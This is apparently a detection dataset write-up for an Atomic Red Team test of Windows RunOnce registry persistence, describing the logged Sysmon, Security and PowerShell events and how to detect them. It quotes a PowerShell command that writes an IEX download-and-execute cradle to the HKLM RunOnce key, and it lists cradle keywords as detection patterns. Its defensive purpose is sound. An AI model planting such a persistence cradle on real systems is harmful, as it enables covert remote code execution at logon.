# T1547.001-3: Registry Run Keys / Startup Folder — PowerShell Registry RunOnce

## Technique Context

MITRE ATT&CK T1547.001 covers persistence and privilege escalation through Windows registry run keys and startup folders. The `RunOnce` key (`HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`) causes a value to execute once at the next user logon and then be automatically deleted by the Windows logon process. Adversaries use `RunOnce` to stage a second-stage payload that fires on the next login without leaving a persistent run key visible to casual inspection after execution.

## What This Dataset Contains

This dataset captures telemetry from the Atomic Red Team test that uses PowerShell's `Set-ItemProperty` cmdlet to write a value named `NextRun` to `HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce`. The value contains a PowerShell `IEX` one-liner that would download and execute a remote script from the Atomic Red Team GitHub repository on next logon. The test is performed entirely within PowerShell without invoking `reg.exe`.

**Sysmon (29 events):**
- EID 1 (Process Create): `whoami.exe` (test framework identity check) spawned by PowerShell. A second PowerShell child process is spawned to execute the test scriptblock, with its full command line logged: `"powershell.exe" & {$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(...)'`. This child PowerShell is the T1547.001 actor.
- EID 3 (Network Connection): Two network connection events from `MsMpEng.exe` (Windows Defender) at a timestamp roughly 9 hours after execution — these are Defender cloud lookup connections unrelated to the test payload.
- EID 7 (Image Load): Multiple DLL loads for PowerShell processes (mscoree, clr, mscorlib) tagged with T1055 and T1574.002 rules — standard .NET runtime initialization.
- EID 10 (Process Access): PowerShell accessing `whoami.exe`.
- EID 11 (File Create): PowerShell startup profile file written; also a transcript or module cache file.
- EID 13 (Registry Value Set): `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun` written by `powershell.exe` with the value `powershell.exe "IEX (New-Object Net.WebClient).DownloadString(..."`. Rule annotated as `technique_id=T1547.001`.
- EID 17 (Pipe Create): Named pipe from PowerShell.

**Security (12 events):**
- EID 4688/4689: Process creates and exits for the outer `powershell.exe`, `whoami.exe`, and the inner `powershell.exe` executing the test. The 4688 event for the inner PowerShell records the full command line including the `Set-ItemProperty` invocation targeting `RunOnce`.
- EID 4703: Token right adjustment for PowerShell — standard test framework activity.

**PowerShell (38 events):**
- EID 4104 (Script Block Logging): Two substantive scriptblocks are logged. The first is the wrapper: `& {$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; set-itemproperty $RunOnceKey "NextRun" '...'`. The second strips the outer ampersand-brace wrapper to show the raw body. The IEX payload URL (`https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`) is fully logged in plaintext.
- EID 4103 (Module Logging): `Set-ItemProperty` cmdlet invocation captured with parameter bindings — Path, Name, and Value all recorded.
- Remainder are boilerplate error-handling scriptblocks from the PowerShell runtime.

## What This Dataset Does Not Contain

- The registered `RunOnce` value was not triggered during collection — no logon cycle fired the `IEX` payload, so there is no network connection to GitHub and no second-stage execution.
- No Security log registry auditing — the EID 4663 (object access) events that would confirm the registry write via the Security channel are absent because object access auditing is not enabled.
- `reg.exe` does not appear in this dataset; the registry write is performed entirely within the PowerShell process.
- The `MsMpEng.exe` network connections visible in Sysmon EID 3 are Defender telemetry events, not test-generated network activity.

## Assessment

The test succeeded. Both Sysmon EID 13 and PowerShell EID 4104 capture the registry write with the full payload value. The IEX download cradle inside the `RunOnce` value is logged in plaintext by script block logging, making this a high-confidence detection scenario. Windows Defender did not prevent the registry write — the `RunOnce` key modification by PowerShell is not blocked under the active policy, though the eventual execution of a remote IEX cradle at logon might be.

The Sysmon EID 13 event is particularly valuable here because it records both the target registry path and the full value data, capturing the `IEX` one-liner that would execute at next logon.

## Detection Opportunities Present in This Data

- **Sysmon EID 13**: Registry write to `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\*` by `powershell.exe`. The Details field contains the full payload including `IEX` and `Net.WebClient.DownloadString`.
- **PowerShell EID 4104**: Script block logging captures the `Set-ItemProperty` call targeting a `Run` or `RunOnce` key path with a PowerShell download cradle as the value — a high-fidelity indicator.
- **PowerShell EID 4103**: Module logging records `Set-ItemProperty` parameter bindings, confirming the key path and value name.
- **Security EID 4688**: Inner `powershell.exe` command line includes the literal `RunOnce` key path and the `IEX` payload.
- **Pattern**: PowerShell writing to any `HKLM:\...\Run` or `HKCU:\...\Run` key path containing `IEX`, `DownloadString`, `WebClient`, or similar download cradle indicators is a strong detection signal.
